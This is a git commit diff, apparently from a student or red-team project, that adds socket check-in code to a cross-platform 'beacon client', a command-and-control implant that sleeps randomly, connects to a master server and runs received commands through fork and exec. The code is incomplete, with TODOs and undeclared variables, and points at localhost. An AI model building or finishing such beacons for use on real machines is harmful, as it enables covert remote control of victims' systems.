e5c1fac09553a11908aa781f2afa5fc435b60ac1
Edward Mead <exm6939@rit.edu>
2015-11-25 23:23:13 -0500

    Added more connection related code.

--- backend/beacon_client.c
+++ backend/beacon_client.c
@@ -3,29 +3,119 @@
 #include "beacon_client.h"
 
 int main(int argc, char **argv){
+    struct sockaddr_in master;
     while ( 1 ) {
         int sleep_time = (rand() % 60) + 5;
         #ifdef CLIENT_DEBUG
-        printf("Sleeping for %d seconds... ",sleep_time);
+            printf("Sleeping for %d seconds... ",sleep_time);
         #endif
 
-        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
-        sleep(sleep_time); //seconds
+        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
+            sleep(sleep_time); //seconds
         #elif __windows__
-        Sleep(sleep_time*1000); //seconds -> milliseconds
+            Sleep(sleep_time*1000); //seconds -> milliseconds
         #endif
-        
+
         #ifdef CLIENT_DEBUG
-        printf("Complete.\n");
+            printf("Complete.\n");
         #endif
-        
+
         // TODO Finish:
         // check-in to server & send back previous command results
         // if command
             // run command
             // save results to be sent back on next beacon
-        
+
     }
+    return 0;
+}
+
+/*
+ * Initalize connection
+ */
+int master_init(struct sockaddr_in master) {
+
+    #if defined __apple__ || defined(__linux__) || defined(__unix__)
+        memset(&master, 0, sizeof(master));
+        master.sin_family = AF_INET;
+        master.sin_addr.s_addr = inet_addr( MASTER_IP );
+        master.sin_port = MASTER_PORT;
+    #elif __windows__
+
+    #endif
+    return 0;
+}
+
+int master_checkin(struct sockaddr_in master, char *data){
+
+    #if defined __apple__ || defined(__linux__) || defined(__unix__)
+        // do standard sockets
+        int s;
+        if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
+            #ifdef CLIENT_DEBUG
+                printf("[master_checkin] Socket creation failed.");
+            #endif
+            return -1;
+        }
+        // Establish connection
+        if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
+            #ifdef CLIENT_DEBUG
+                printf("[master_checkin] Connect to master failed.");
+            #endif
+            return -1;
+        }
+    #elif __windows__
+        WSADATA wsa;
+        SOCKET s;
+
+        #ifdef CLIENT_DEBUG
+            printf("[master_checkin] Initialising...");
+        #endif
+        if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+        {
+            #ifdef CLIENT_DEBUG
+                printf("Failed. Error: %d",WSAGetLastError());
+            #endif
+            return -1; //windows being windows
+        }
+
+        //Create a socket
+        if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+        {
+            #ifdef CLIENT_DEBUG
+                printf("Could not create socket : %d" , WSAGetLastError());
+            #endif
+            return -1; //failed to make socket... die
+        }
+
+        // Connection settings
+        master.sin_addr.s_addr = inet_addr( MASTER_IP );
+        master.sin_family = AF_INET;
+        master.sin_port = htons( MASTER_PORT );
+
+        // Connect to master
+        if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0)
+        {
+            return -1; //couldn't connect... shit.
+        }
+
+        // Send data
+        if( send(s , data , strlen(data) , 0) < 0)
+        {
+            return -1; //something failed :(
+        }
+        //Receive a reply from the server
+        if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
+        {
+            puts("recv failed");
+        }
+
+        puts("Reply received\n");
+
+        //Add a NULL terminating character to make it a proper string before printing
+        server_reply[recv_size] = '\0';
+        puts(server_reply);
+    #endif
     return 0;
 }
 
@@ -43,7 +133,7 @@ char *run_cmd(char *cmd,char **param) {
         #endif
         return NULL; // fail
     }
-    if ((pid = fork()) == -1) { 
+    if ((pid = fork()) == -1) {
         #ifdef CLIENT_DEBUG
             puts("[run_cmd] Failed to fork.\n");
         #endif
@@ -53,19 +143,19 @@ char *run_cmd(char *cmd,char **param) {
     if(pid == 0) {
         // TODO: FIX from direct exec to
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
-        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
+        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
             dup2(pipes[1], STDOUT_FILENO);
         #elif __windows__
             _dup2(pipes[1], STDOUT_FILENO);
         #endif
         close(pipes[0]);
         close(pipes[1]);
-        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
-        if (param) {
-            execv(cmd,param);
-        } else {
-            execl(cmd,"");
-        }
+        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
+            if (param) {
+                execv(cmd,param);
+            } else {
+                execl(cmd,"");
+            }
         #elif __windows__
             _execv(cmd,param);
         #endif
--- backend/beacon_client.h
+++ backend/beacon_client.h
@@ -1,31 +1,79 @@
 
 #define BUF_SIZE 8192
-
+#define MASTER_IP "127.0.0.1"
+#define MASTER_PORT 80
+#define MASTER_RECV_SIZE 4096
 #ifdef _WIN32
-    #define __windows__ //consistancy
+    #warning "Compiling for Windows!"
+    #define __windows__ //consistency
     #define SHELL "C:\\windows\\system32\\cmd.exe"
     #define OS "Windows"
     #define ID_CMD "VER"
-    #include <windows.h>
-    #include <io.h>
-    #include <process.h>
+    #include <windows.h> //windows stuff
+    #include <io.h> //dup2
+    #include <process.h> //exec
+    #include <winsock2.h> //sockets
+    #include <ws2tcpip.h>
+    #include <iphlpapi.h>
+    #pragma comment(lib,"ws2_32.lib")
+
+    // structs taken from microsoft msdn
+    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms740496(v=vs.85).aspx
+    typedef struct addrinfo {
+        int             ai_flags;
+        int             ai_family;
+        int             ai_socktype;
+        int             ai_protocol;
+        size_t          ai_addrlen;
+        char            *ai_canonname;
+        struct sockaddr  *ai_addr;
+        struct addrinfo  *ai_next;
+    } ADDRINFOA, *PADDRINFOA;
+     
+    typedef struct sockaddr {
+    #if (_WIN32_WINNT < 0x0600)
+        u_short sa_family;
+    #else 
+        ADDRESS_FAMILY sa_family;
+    #endif //(_WIN32_WINNT < 0x0600)
+        CHAR sa_data[14];
+    } SOCKADDR, *PSOCKADDR, FAR *LPSOCKADDR;
+    
+    typedef struct sockaddr_in {
+    #if(_WIN32_WINNT < 0x0600)
+        short   sin_family;    
+    #else //(_WIN32_WINNT < 0x0600)
+        ADDRESS_FAMILY sin_family;
+    #endif //(_WIN32_WINNT < 0x0600)
+        USHORT sin_port;
+        IN_ADDR sin_addr;
+        CHAR sin_zero[8];
+    } SOCKADDR_IN, *PSOCKADDR_IN;
+    
 #elif __APPLE__
-    #define __apple__ //consistancy
     #include "TargetConditionals.h"
     #if TARGET_OS_MAC
+        #warning "Compiling for Mac!"
+        #define __apple__ //consistency
         #define SHELL "/bin/bash"
         #define OS "Mac (Unix)"
         #define ID_CMD "sw_vers"
-        #include <unistd.h>
+        #include <unistd.h> //dup, fork, exec, etc
+        #include <arpa/inet.h> //inet_ntoa
+        #include <netinet/in.h> //in_addr
+        #include <sys/socket.h> //socket
+        #include <string.h> //strlen
     #else
     #   error "Unsupported OS"
     #endif
 #elif __linux__
+    #warning "Compiling for Linux!"
     #define SHELL "/bin/bash"
     #define OS "Linux"
     #define ID_CMD "cat /etc/*releases || lsb_release -a || cat /proc/version"
     #include <unistd.h>
 #elif __unix__
+    #warning "Compiling for Unix!"
     #define SHELL "/bin/sh"
     #define OS "Unix"
     #define ID_CMD "uname -a"
@@ -35,5 +83,6 @@
 #endif
 
 char *get_os();
+int master_checkin(struct sockaddr_in master, char * data);
 
 char *run_cmd(char *cmd, char **param);
